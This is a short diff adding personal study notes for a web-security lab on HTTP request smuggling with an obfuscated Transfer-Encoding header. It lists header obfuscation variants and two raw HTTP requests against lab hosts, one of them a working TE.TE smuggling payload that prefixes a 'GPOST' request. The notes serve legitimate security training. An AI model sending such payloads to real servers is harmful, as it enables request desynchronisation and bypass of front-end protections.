@@ -1,0 +1,44 @@
+Lab: HTTP request smuggling, obfuscating the TE header
+Notes:
+    Obfuscating Techniques:
+        -Transfer-Encoding: xchunked
+        -Transfer-Encoding : chunked
+        -Transfer-Encoding: chunked
+         Transfer-Encoding: x
+        -Transfer-Encoding:[tab]chunked
+        -[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+Analysis:
+(1)
+POST / HTTP/1.1
+Host: 0aff00590450856180cd940400070038.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+x
+-----------> Rejected(TE.TE)
+
+(2)
+POST / HTTP/1.1
+Host: 0a3d00c103f413fe81c31bd400ab009d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-Encoding: abc  -----> obfuscating the request
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+-----------> Send two times.
